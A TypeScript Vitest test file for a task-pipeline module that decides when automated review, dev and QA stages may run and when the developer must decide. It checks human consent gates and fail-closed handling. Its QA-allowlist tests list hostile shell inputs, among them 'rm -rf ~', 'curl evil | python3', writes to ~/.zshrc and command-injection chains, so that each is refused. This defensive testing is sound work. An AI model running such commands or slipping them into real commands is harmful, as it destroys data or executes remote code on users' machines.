import fs from 'node:fs/promises'
import { describe, expect, it } from 'vitest'
import {
  collectNeedsYou,
  decideNextAction,
  DEFAULT_DECISION_CONTEXT,
  DEFAULT_QA_START_POLICY,
  dispatchTimelineNote,
  freshTmuxName,
  INTENT_BRIEF_STAGES,
  isLoadTooHigh,
  isQaPreApproved,
  LOAD_AVERAGE_CEILING,
  planSweep,
  type DecisionContext,
  type NextActionInput,
  type SweepTask,
} from './nextAction.js'
import { DS_HANDOFFS, NEXT_STAGE_BY_WAITING_REASON, QA_SKIPPED_STATUS_REASON } from './nextStageCta.js'
import { computeAutoDispatch, STAGE_SKILL } from './taskParser.js'

// pipelinely-babysit-skill-plan M0 — committed red: ./nextAction.ts does not
// exist yet. One decision per task state, shared by auto mode
// (computeAutoDispatch), the /pipelinely-babysit CLI and the Push forward route,
// so none of them can disagree about what is safe to do next.

const UI_VERIFY = 'npx tsc --noEmit && npx vitest run && npx playwright test --project=ui --grep-invert @pending'
const UNIT_VERIFY = 'npx tsc --noEmit && npx vitest run'

// Every QA-entry marker routes through the same consent and brief gates.
const QA_MARKERS = ['CR approved, ready for QA', 'comments addressed, ready for QA', 'fixes pushed, ready to re-run QA']

// QA consent is ONLY what SETTINGS.json's qaStartPolicy records. The default
// context is what a missing or unreadable setting means: ask every time.
const PREAPPROVED: DecisionContext = { ...DEFAULT_DECISION_CONTEXT, qaStartPolicy: 'cockpit-ai-ui-preapproved' }
// What the gates would allow once pipelinely-qa renders its brief through
// stage-brief (not on master yet): lets the dispatch path be tested today.
const WITH_QA_BRIEF: DecisionContext = { ...DEFAULT_DECISION_CONTEXT, intentBriefStages: [...INTENT_BRIEF_STAGES, 'qa'] }
const PREAPPROVED_WITH_QA_BRIEF: DecisionContext = { ...PREAPPROVED, intentBriefStages: WITH_QA_BRIEF.intentBriefStages }

function waiting(waitingReason: string, extra: Partial<NextActionInput> = {}): NextActionInput {
  return { status: 'waiting', waitingReason, repo: 'cockpit-ai', verifier: UNIT_VERIFY, stageHistory: [], ...extra }
}

function sweepTask(slug: string, waitingReason: string, extra: Partial<SweepTask> = {}): SweepTask {
  return { slug, ...waiting(waitingReason), ...extra }
}

const REVIEW_COMMENT = { severity: 'suggestion', selected: false }

const PLAN_REVIEWED = [{ stage: 'plan-review' as const, at: '2026-10-05T08:00:00Z', note: 'round 1: tightened M2' }]

function dispatched(stage: 'dev' | 'plan-review' | 'code-review', by: 'auto mode' | 'babysit') {
  return { stage, at: '2026-10-05T09:00:00Z', note: `auto-dispatched — ${by}` }
}

describe('nextAction module', () => {
  it('imports only types and the pure nextStageCta module, so the web bundle can use it', async () => {
    const source = await fs.readFile(new URL('./nextAction.ts', import.meta.url), 'utf-8')
    const imports = [...source.matchAll(/^import\s+(.+?)\s+from\s+'([^']+)'/gm)].map((m) => ({ clause: m[1], from: m[2] }))

    expect(imports.length).toBeGreaterThan(0)
    expect(imports.every(({ clause, from }) => clause.startsWith('type ') || from === './nextStageCta.js')).toBe(true)
  })
})

describe('decideNextAction — every waiting marker', () => {
  it('pins the table so a new marker cannot ship without a decision here', () => {
    expect(NEXT_STAGE_BY_WAITING_REASON.map((m) => m.marker)).toEqual([
      'plan ready for review',
      'plan reviewed, ready for dev',
      'PR open, ready for CR',
      'triage and dispatch cr-fixes',
      'CR approved, ready for QA',
      'comments addressed, ready for QA',
      'triage and dispatch qa-fixes',
      'fixes pushed, ready to re-run QA',
    ])
  })

  it('dispatches plan review', () => {
    expect(decideNextAction(waiting('plan ready for review'))).toEqual({ kind: 'dispatch', stage: 'plan-review', marker: 'plan ready for review' })
  })

  it('dispatches dev for a flat task', () => {
    expect(decideNextAction(waiting('plan reviewed, ready for dev'))).toEqual({ kind: 'dispatch', stage: 'dev', marker: 'plan reviewed, ready for dev' })
  })

  it('never dispatches dev on a milestone parent: which milestones to start is the developer\'s call', () => {
    const parent = waiting('plan reviewed, ready for dev', {
      stageHistory: PLAN_REVIEWED,
      milestones: [{ id: 'M0', needs: [], state: 'done' }, { id: 'M1', needs: ['M0'], state: 'queued' }],
    })
    expect(decideNextAction(parent)).toEqual({ kind: 'needs-you', reason: 'start-milestones' })
  })

  it('a milestone parent with no milestone ready to start has nothing to do: its children carry their own state', () => {
    const allStarted = waiting('plan reviewed, ready for dev', {
      stageHistory: PLAN_REVIEWED,
      milestones: [{ id: 'M0', needs: [], state: 'dispatched' }, { id: 'M1', needs: ['M0'], state: 'queued' }],
    })
    expect(decideNextAction(allStarted)).toEqual({ kind: 'idle' })
  })

  it('a legacy task with no INTENT.md is still reviewed: stage-brief renders a NO RECORDED INTENT brief, never refuses', () => {
    expect(decideNextAction(waiting('PR open, ready for CR', { stageHistory: [] }))).toEqual({ kind: 'dispatch', stage: 'code-review', marker: 'PR open, ready for CR' })
  })

  it('dispatches code review on an open PR', () => {
    expect(decideNextAction(waiting('PR open, ready for CR'))).toEqual({ kind: 'dispatch', stage: 'code-review', marker: 'PR open, ready for CR' })
  })

  it('stops for the developer when CR found comments (triage is theirs)', () => {
    expect(decideNextAction(waiting('CR found 2 must-fix comments, triage and dispatch cr-fixes'))).toEqual({ kind: 'needs-you', reason: 'review-comments' })
  })

  it('stops for the developer on an approved review that still lists comments', () => {
    const task = waiting('CR approved, ready for QA', { findings: [REVIEW_COMMENT] })
    expect(decideNextAction(task, PREAPPROVED_WITH_QA_BRIEF)).toEqual({ kind: 'needs-you', reason: 'review-comments' })
  })

  it('fails closed on an unparseable review: it counts as having comments', () => {
    const task = waiting('CR approved, ready for QA', { findings: [], findingsParseMismatch: ['Should Fix: header says 3, parsed 0'] })
    expect(decideNextAction(task, PREAPPROVED_WITH_QA_BRIEF)).toEqual({ kind: 'needs-you', reason: 'review-comments' })
  })

  it('stops for the developer when QA found failures (triage is theirs)', () => {
    expect(decideNextAction(waiting('QA found 1 issues, triage and dispatch qa-fixes'))).toEqual({ kind: 'needs-you', reason: 'qa-findings' })
  })

  it.each(QA_MARKERS)('records a QA skip, and dispatches nothing, when QA is not applicable: %s', (marker) => {
    const task = waiting(marker, { qaSkipReason: 'no e2e command in VERIFY and the PR changes no e2e spec' })
    expect(decideNextAction(task)).toEqual({ kind: 'skip-qa', marker, reason: 'no e2e command in VERIFY and the PR changes no e2e spec' })
  })

  it.each(QA_MARKERS)('dispatches QA only when the recorded setting pre-approves it and QA has an intent brief: %s', (marker) => {
    expect(decideNextAction(waiting(marker, { verifier: UI_VERIFY }), PREAPPROVED_WITH_QA_BRIEF)).toEqual({ kind: 'dispatch', stage: 'qa', marker })
  })

  it.each(QA_MARKERS)('asks every time by default, even for a ui-only VERIFY with a brief: %s', (marker) => {
    expect(DEFAULT_QA_START_POLICY).toBe('ask-every-time')
    expect(decideNextAction(waiting(marker, { verifier: UI_VERIFY }))).toEqual({ kind: 'needs-you', reason: 'qa-consent' })
    expect(decideNextAction(waiting(marker, { verifier: UI_VERIFY }), WITH_QA_BRIEF)).toEqual({ kind: 'needs-you', reason: 'qa-consent' })
  })

  it.each(QA_MARKERS)('never infers consent from the task\'s auto-mode toggle: %s', (marker) => {
    const optedIn = waiting(marker, { verifier: UI_VERIFY, autoMode: true })
    expect(decideNextAction(optedIn, WITH_QA_BRIEF)).toEqual({ kind: 'needs-you', reason: 'qa-consent' })
  })

  it.each(QA_MARKERS)('asks before QA the setting does not cover, even with the setting on: %s', (marker) => {
    const task = waiting(marker, { verifier: 'npx playwright test e2e/board.spec.ts' })
    expect(decideNextAction(task, PREAPPROVED)).toEqual({ kind: 'needs-you', reason: 'qa-consent' })
    expect(decideNextAction(task, PREAPPROVED_WITH_QA_BRIEF)).toEqual({ kind: 'needs-you', reason: 'qa-consent' })
  })

  it.each(QA_MARKERS)('never dispatches QA without an intent brief, even pre-approved: %s', (marker) => {
    expect(INTENT_BRIEF_STAGES).not.toContain('qa')
    expect(decideNextAction(waiting(marker, { verifier: UI_VERIFY }), PREAPPROVED)).toEqual({ kind: 'needs-you', reason: 'qa-intent-brief' })
  })

  it('never dispatches code review without an intent brief', () => {
    expect(decideNextAction(waiting('PR open, ready for CR'), { intentBriefStages: [] })).toEqual({ kind: 'needs-you', reason: 'review-intent-brief' })
  })
})

describe('decideNextAction — the ds hand-offs are all the developer\'s in v1', () => {
  const dsWaiting = (reason: string, extra: Partial<NextActionInput> = {}) => waiting(reason, { kind: 'ds', ...extra })

  it('pins the ds overlay so a new ds marker cannot ship without a decision here', () => {
    expect(DS_HANDOFFS.map((m) => m.marker)).toEqual([
      'QA passed, ready to merge',
      QA_SKIPPED_STATUS_REASON,
      'ready for design approval',
      'triage and dispatch design-fixes',
      'design fixes pushed, ready to re-run design QA',
      'merged, ready for adopt',
    ])
  })

  it.each([
    ['QA passed, ready to merge'],
    ['design fixes pushed, ready to re-run design QA'],
    ['design changes requested, triage and dispatch design-fixes'],
    ['merged, ready for adopt'],
  ])('stops for the developer at "%s" with the shared ds-stage reason, never dispatching', (reason) => {
    expect(decideNextAction(dsWaiting(reason), PREAPPROVED_WITH_QA_BRIEF)).toEqual({ kind: 'needs-you', reason: 'ds-stage' })
  })

  it('stops at the designer\'s gate with its own reason', () => {
    expect(decideNextAction(dsWaiting('design QA done, ready for design approval'))).toEqual({ kind: 'needs-you', reason: 'design-approval' })
  })

  it('stops for a design-approved task at merge, like dev', () => {
    expect(decideNextAction(dsWaiting('design approved, ready to merge'))).toEqual({ kind: 'needs-you', reason: 'merge' })
  })

  it('still skips QA for a ds task whose QA is not applicable: the skip then hands off to design QA', () => {
    const task = dsWaiting('CR approved, ready for QA', { qaSkipReason: 'no e2e' })
    expect(decideNextAction(task)).toEqual({ kind: 'skip-qa', marker: 'CR approved, ready for QA', reason: 'no e2e' })
  })

  it('a conflicting PR at the gate is the merge-conflicts stop', () => {
    expect(decideNextAction(dsWaiting('design QA done, ready for design approval', { prMergeState: 'conflicting' }))).toEqual({ kind: 'needs-you', reason: 'merge-conflicts' })
  })

  it('a dev task at the same ds markers is unchanged: it asks a question', () => {
    expect(decideNextAction(waiting('design QA done, ready for design approval'))).toEqual({ kind: 'needs-you', reason: 'question' })
  })
})

describe('decideNextAction — the hard stops outside the table', () => {
  it.each(['QA passed, ready to merge', QA_SKIPPED_STATUS_REASON])('never merges: "%s" is a needs-you', (reason) => {
    expect(decideNextAction(waiting(reason))).toEqual({ kind: 'needs-you', reason: 'merge' })
  })

  it('does not read "not ready to merge" as the merge hand-off', () => {
    expect(decideNextAction(waiting('not ready to merge: CR blocking'))).toEqual({ kind: 'needs-you', reason: 'question' })
  })

  it.each([...NEXT_STAGE_BY_WAITING_REASON.map((m) => m.marker), 'QA passed, ready to merge'])(
    'a conflicting PR is the developer\'s Fix conflicts click, whatever the hand-off: %s',
    (marker) => {
      const task = waiting(marker, { prMergeState: 'conflicting', qaSkipReason: 'no e2e', verifier: UI_VERIFY })
      expect(decideNextAction(task, PREAPPROVED_WITH_QA_BRIEF)).toEqual({ kind: 'needs-you', reason: 'merge-conflicts' })
    },
  )

  it.each(['mergeable', 'unknown'] as const)('a %s merge state changes nothing', (prMergeState) => {
    expect(decideNextAction(waiting('PR open, ready for CR', { prMergeState }))).toEqual({ kind: 'dispatch', stage: 'code-review', marker: 'PR open, ready for CR' })
  })

  it('a research deliverable waits for the developer to read it', () => {
    expect(decideNextAction(waiting('audit ready for developer review'))).toEqual({ kind: 'needs-you', reason: 'result-review' })
  })

  it('any other waiting reason is a question only the developer can answer', () => {
    expect(decideNextAction(waiting('need a decision: which port?'))).toEqual({ kind: 'needs-you', reason: 'question' })
    expect(decideNextAction({ status: 'waiting', waitingReason: undefined, repo: 'cockpit-ai', verifier: null, stageHistory: [] })).toEqual({ kind: 'needs-you', reason: 'question' })
  })

  it.each(['working', 'paused', 'review', 'done', 'handover', 'shelved'] as const)('a %s task has nothing to do, even with a hand-off phrase on it', (status) => {
    expect(decideNextAction({ ...waiting('PR open, ready for CR'), status })).toEqual({ kind: 'idle' })
  })

  it('every dispatch it can return targets the orchestrator: never an own-session command', () => {
    const everyState = [
      ...NEXT_STAGE_BY_WAITING_REASON.map((m) => waiting(m.marker, { verifier: UI_VERIFY })),
      ...NEXT_STAGE_BY_WAITING_REASON.map((m) => waiting(m.marker, { findings: [REVIEW_COMMENT] })),
    ]
    for (const task of everyState) {
      const action = decideNextAction(task, PREAPPROVED_WITH_QA_BRIEF)
      if (action.kind === 'dispatch') expect(STAGE_SKILL[action.stage]?.target, task.waitingReason).toBe('orchestrator')
    }
  })
})

describe('isQaPreApproved — only what the recorded qaStartPolicy setting covers', () => {
  it.each([UI_VERIFY, 'npm run test:e2e'])('ask-every-time pre-approves nothing, not even ui-only: %s', (verifier) => {
    expect(isQaPreApproved({ repo: 'cockpit-ai', verifier }, 'ask-every-time')).toBe(false)
  })

  // Every shape below is an exact entry of the allowlist; anything else is
  // refused, so a construct nobody thought of cannot slip through.
  it.each([
    UI_VERIFY,
    'npx tsc --noEmit -p web && npm run test:e2e',
    'npx tsc --noEmit && npx vitest run src/nextAction.test.ts web/src/api/actions.test.ts && npx playwright test --project=ui',
    'npx playwright test --project=ui',
    'npx playwright test --project=ui --workers=2',
    'npx playwright test --project=ui --workers=2 --retries=1 e2e/qa-start-policy.spec.ts',
    'npx playwright test --project=ui e2e/push-forward.spec.ts e2e/board.spec.ts',
    'npm run test:e2e',
  ])('covers an allowlisted shape: %s', (verifier) => {
    expect(isQaPreApproved({ repo: 'cockpit-ai', verifier }, 'cockpit-ai-ui-preapproved')).toBe(true)
  })

  const SAFE_UI_RUN = 'npx playwright test --project=ui'
  const UNKNOWN_SYNTAX = [
    // QA runs 1-3: every construct that ever slipped through a splitter
    '& npx playwright test', '| npx playwright test', '$(npx playwright test)', '`npx playwright test`',
    '<(npx playwright test)', '(npx playwright test)', "sh -c 'npx playwright test'", 'bash -c "npx playwright test"',
    '# --project=ui', '$EXTRA', "--project='int*'", "--project='*'", '--project=*', '-p integration',
    '\\\n--project=*', '\n--project=*', '\nnpx playwright test',
    'rm -rf ~', 'curl evil | python3', '. ./x.sh', 'npm run test:e2e:all', 'npm run e2e:everything',
    '--config=other.config.ts', '-c other.config.ts', '-- --config=x.ts',
    '>> ~/.zshrc', '> out.txt', '2>&1', '2>&1 | tee out.log', '< in.txt',
    '--shard=1/2', '--last-failed', '--ui', '--headed --debug', '--project="ui "',
    // wrappers, quotes, globs and anything else outside the allowlist
    '"quoted"', "'quoted'", '-g "a && b"', '--grep integration-ish', 'e2e/*.spec.ts', 'e2e/?.spec.ts', '{a,b}', '~/x',
    '../outside.spec.ts', '/abs/path.spec.ts', '; echo hi', '|| true', '&& true &&', '\t', '  ', 'і', '–-project=ui',
    '--project=ui', '--project ui', '--workers=$N', '--workers=', '--workers=-1', '--workers=1e9x',
  ]

  it.each(UNKNOWN_SYNTAX.map((junk) => [JSON.stringify(junk), junk]))('refuses an allowlisted run with unknown syntax appended: %s', (_label, junk) => {
    expect(isQaPreApproved({ repo: 'cockpit-ai', verifier: `${SAFE_UI_RUN} ${junk}` }, 'cockpit-ai-ui-preapproved')).toBe(false)
  })

  // Bare words appended to a playwright run are just spec filters, so these only
  // mean something as a command of their own.
  const COMMANDS_AS_WORDS = ['eval npx playwright test', 'source x.sh', 'sh x.sh', 'xargs rm']

  it.each([...UNKNOWN_SYNTAX, ...COMMANDS_AS_WORDS].map((junk) => [JSON.stringify(junk), junk]))('refuses unknown syntax chained after or before an allowlisted run: %s', (_label, junk) => {
    expect(isQaPreApproved({ repo: 'cockpit-ai', verifier: `${SAFE_UI_RUN} && ${junk}` }, 'cockpit-ai-ui-preapproved')).toBe(false)
    expect(isQaPreApproved({ repo: 'cockpit-ai', verifier: `${junk} && ${SAFE_UI_RUN}` }, 'cockpit-ai-ui-preapproved')).toBe(false)
  })

  it.each([
    ['environment prefix', 'PW_TEST_PROJECT=all npx playwright test --project=ui'],
    ['environment prefix on the ui script', 'PLAYWRIGHT_CONFIG=x npm run test:e2e'],
    ['yarn runner', 'yarn playwright test --project=ui'],
    ['pnpm runner', 'pnpm exec playwright test --project=ui'],
    ['direct binary', 'node_modules/.bin/playwright test --project=ui'],
    ['npx flag before the package', 'npx --yes playwright test --project=ui'],
    ['no project flag runs every project', 'npx playwright test e2e/board.spec.ts'],
    ['the integration project', 'npx playwright test --project=integration'],
    ['the integration script', 'npm run test:e2e:integration'],
    ['the vm script', 'npm run test:e2e:vm'],
    ['ui plus the integration runner', 'npx playwright test --project=ui && bash scripts/e2e-integration/run.sh'],
    ['ui plus an e2e/integration path', 'npx playwright test --project=ui e2e/integration/tab.spec.ts'],
    ['two project flags', 'npx playwright test --project=ui --project=ui'],
    ['upper-case project', 'npx playwright test --project=UI'],
    ['a project that only starts with ui', 'npx playwright test --project=ui2'],
    ['quoted project', 'npx playwright test --project="ui"'],
    ['no e2e at all', UNIT_VERIFY],
    ['a single & instead of &&', 'npx tsc --noEmit & npx playwright test'],
    ['a newline instead of &&', 'npx playwright test --project=ui\nnpx playwright test'],
    ['two spaces around &&', 'npx tsc --noEmit  &&  npx playwright test --project=ui'],
    ['a trailing space', 'npx playwright test --project=ui '],
    ['a leading space', ' npx playwright test --project=ui'],
    ['extra args through the ui script', 'npm run test:e2e -- --config=x.ts'],
  ])('refuses a shape that is not on the allowlist: %s', (_label, verifier) => {
    expect(isQaPreApproved({ repo: 'cockpit-ai', verifier }, 'cockpit-ai-ui-preapproved')).toBe(false)
  })

  it('applies to cockpit-ai only', () => {
    expect(isQaPreApproved({ repo: 'carpool-website', verifier: UI_VERIFY }, 'cockpit-ai-ui-preapproved')).toBe(false)
  })

  it('fails closed with no VERIFY', () => {
    expect(isQaPreApproved({ repo: 'cockpit-ai', verifier: null }, 'cockpit-ai-ui-preapproved')).toBe(false)
  })
})

describe('isLoadTooHigh', () => {
  it('holds at the ceiling and refuses above it', () => {
    expect(LOAD_AVERAGE_CEILING).toBe(10)
    expect(isLoadTooHigh(3.2)).toBe(false)
    expect(isLoadTooHigh(10)).toBe(false)
    expect(isLoadTooHigh(10.01)).toBe(true)
  })

  it('fails closed on an unreadable load average', () => {
    expect(isLoadTooHigh(Number.NaN)).toBe(true)
  })
})

describe('planSweep', () => {
  it('orders the safe actions furthest-along first, and lists each task once', () => {
    const plan = planSweep(
      [
        sweepTask('a-plan', 'plan ready for review'),
        sweepTask('b-cr', 'PR open, ready for CR'),
        sweepTask('c-skip', 'CR approved, ready for QA', { qaSkipReason: 'no e2e' }),
        sweepTask('d-dev', 'plan reviewed, ready for dev'),
      ],
      { load1: 2 },
    )
    expect(plan.actions.map((a) => a.slug)).toEqual(['c-skip', 'b-cr', 'd-dev', 'a-plan'])
    expect(plan.needsYou).toEqual([])
    expect(plan.deferred).toEqual([])
    expect(plan.isLoadTooHigh).toBe(false)
  })

  it('does nothing above the load ceiling and says what it held back', () => {
    const plan = planSweep([sweepTask('b-cr', 'PR open, ready for CR'), sweepTask('m', 'QA passed, ready to merge')], { load1: 14.5 })
    expect(plan.isLoadTooHigh).toBe(true)
    expect(plan.actions).toEqual([])
    expect(plan.deferred).toEqual([{ slug: 'b-cr', why: 'load' }])
    expect(plan.needsYou).toEqual([{ slug: 'm', reason: 'merge' }])
  })

  it('starts at most one QA per sweep', () => {
    const plan = planSweep(
      [sweepTask('qa-1', 'CR approved, ready for QA', { verifier: UI_VERIFY }), sweepTask('qa-2', 'fixes pushed, ready to re-run QA', { verifier: UI_VERIFY })],
      { load1: 1 },
      PREAPPROVED_WITH_QA_BRIEF,
    )
    expect(plan.actions.map((a) => a.slug)).toEqual(['qa-1'])
    expect(plan.deferred).toEqual([{ slug: 'qa-2', why: 'one-qa-per-sweep' }])
  })

  it('starts no QA while another QA is still running', () => {
    const plan = planSweep(
      [
        { slug: 'running-qa', status: 'working', repo: 'cockpit-ai', verifier: UI_VERIFY, stage: 'qa', stageHistory: [] },
        sweepTask('qa-next', 'CR approved, ready for QA', { verifier: UI_VERIFY }),
        sweepTask('b-cr', 'PR open, ready for CR'),
      ],
      { load1: 1 },
      PREAPPROVED_WITH_QA_BRIEF,
    )
    expect(plan.actions.map((a) => a.slug)).toEqual(['b-cr'])
    expect(plan.deferred).toEqual([{ slug: 'qa-next', why: 'qa-in-flight' }])
  })

  it('lists merges first, oldest PR first, since each merge can re-conflict the rest', () => {
    const plan = planSweep(
      [
        sweepTask('q', 'need a decision: which port?'),
        sweepTask('m-new', 'QA passed, ready to merge', { prNumber: '152' }),
        sweepTask('m-old', QA_SKIPPED_STATUS_REASON, { prNumber: '97' }),
      ],
      { load1: 1 },
    )
    expect(plan.needsYou).toEqual([
      { slug: 'm-old', reason: 'merge' },
      { slug: 'm-new', reason: 'merge' },
      { slug: 'q', reason: 'question' },
    ])
  })

  it('leaves idle tasks out of every list', () => {
    const plan = planSweep([{ slug: 'w', status: 'working', repo: 'cockpit-ai', verifier: null, stageHistory: [] }], { load1: 1 })
    expect(plan).toEqual({ actions: [], needsYou: [], deferred: [], isLoadTooHigh: false })
  })

  it('never re-dispatches a hand-off auto mode or an earlier sweep already dispatched, and says so', () => {
    const plan = planSweep(
      [
        sweepTask('auto-sent', 'PR open, ready for CR', { stageHistory: [dispatched('code-review', 'auto mode')] }),
        sweepTask('swept', 'plan ready for review', { stageHistory: [dispatched('plan-review', 'babysit')] }),
      ],
      { load1: 1 },
    )
    expect(plan.actions).toEqual([])
    expect(plan.deferred).toEqual([{ slug: 'auto-sent', why: 'dispatch-in-flight' }, { slug: 'swept', why: 'dispatch-in-flight' }])
  })

  it('retries, in a later sweep, a hand-off whose last dispatch failed', () => {
    const failed = { stage: 'code-review' as const, at: '2026-10-05T10:00:00Z', note: 'auto-dispatch failed — orchestrator not running' }
    const plan = planSweep([sweepTask('b-cr', 'PR open, ready for CR', { stageHistory: [failed] })], { load1: 1 })
    expect(plan.actions.map((a) => a.slug)).toEqual(['b-cr'])
  })

  it('a dispatch note for an earlier stage does not hold back the next one', () => {
    const plan = planSweep([sweepTask('b-cr', 'PR open, ready for CR', { stageHistory: [dispatched('dev', 'auto mode')] })], { load1: 1 })
    expect(plan.actions.map((a) => a.slug)).toEqual(['b-cr'])
  })
})

describe('collectNeedsYou', () => {
  it('is exactly planSweep\'s needs-you list, without needing a load reading', () => {
    const tasks = [sweepTask('m', 'QA passed, ready to merge', { prNumber: '3' }), sweepTask('c', 'triage and dispatch cr-fixes'), sweepTask('b-cr', 'PR open, ready for CR')]
    expect(collectNeedsYou(tasks)).toEqual(planSweep(tasks, { load1: 0 }).needsYou)
    expect(collectNeedsYou(tasks).map((i) => i.slug)).toEqual(['m', 'c'])
  })
})

describe('computeAutoDispatch shares the decision', () => {
  const states = [
    waiting('plan ready for review'),
    waiting('plan reviewed, ready for dev'),
    waiting('plan reviewed, ready for dev', { stageHistory: PLAN_REVIEWED, milestones: [{ id: 'M0', needs: [], state: 'queued' }] }),
    waiting('PR open, ready for CR'),
    waiting('triage and dispatch cr-fixes'),
    waiting('CR approved, ready for QA', { verifier: UI_VERIFY }),
    waiting('CR approved, ready for QA', { qaSkipReason: 'no e2e' }),
    waiting('fixes pushed, ready to re-run QA', { verifier: 'npx playwright test' }),
    waiting('QA passed, ready to merge'),
    waiting('PR open, ready for CR', { prMergeState: 'conflicting' }),
  ]

  // Both contexts: the default (nothing pre-approved) and the setting on with
  // a QA brief, so the QA dispatch path is covered by the parity too.
  it.each(states.flatMap((task) => [
    { task, ctx: DEFAULT_DECISION_CONTEXT, label: 'default' },
    { task, ctx: PREAPPROVED_WITH_QA_BRIEF, label: 'pre-approved + brief' },
  ]))('auto mode acts exactly when the sweep would act: $task.waitingReason ($label)', ({ task, ctx }) => {
    const action = decideNextAction(task, ctx)
    const auto = computeAutoDispatch(task, ctx)
    if (action.kind === 'dispatch') expect(auto).toEqual({ stage: action.stage, key: `${action.stage}:${action.marker}` })
    else if (action.kind === 'skip-qa') expect(auto).toEqual({ stage: 'qa', key: `qa-skipped:${action.marker}`, skipReason: action.reason })
    else expect(auto).toBeNull()
  })
})

describe('what the sweep writes', () => {
  it('its TIMELINE note never carries a PR number (the dashboard takes the first #N of a dev note)', () => {
    expect(dispatchTimelineNote('babysit')).toBe('auto-dispatched — babysit')
    expect(dispatchTimelineNote('babysit')).not.toMatch(/#\d/)
  })

  it('shares its shape with auto mode\'s note, byte for byte, so whatever skips auto-dispatch lines skips both', () => {
    expect(dispatchTimelineNote('auto mode')).toBe('auto-dispatched — auto mode')
  })
})

describe('freshTmuxName — never kill a finished session to reuse its name', () => {
  it('keeps the base name when it is free', () => {
    expect(freshTmuxName('worker-x-cr', new Set(['worker-x']))).toBe('worker-x-cr')
  })

  it('numbers past every name already taken', () => {
    expect(freshTmuxName('worker-x-cr', new Set(['worker-x-cr']))).toBe('worker-x-cr2')
    expect(freshTmuxName('worker-x-qa', new Set(['worker-x-qa', 'worker-x-qa2', 'worker-x-qa3']))).toBe('worker-x-qa4')
  })
})
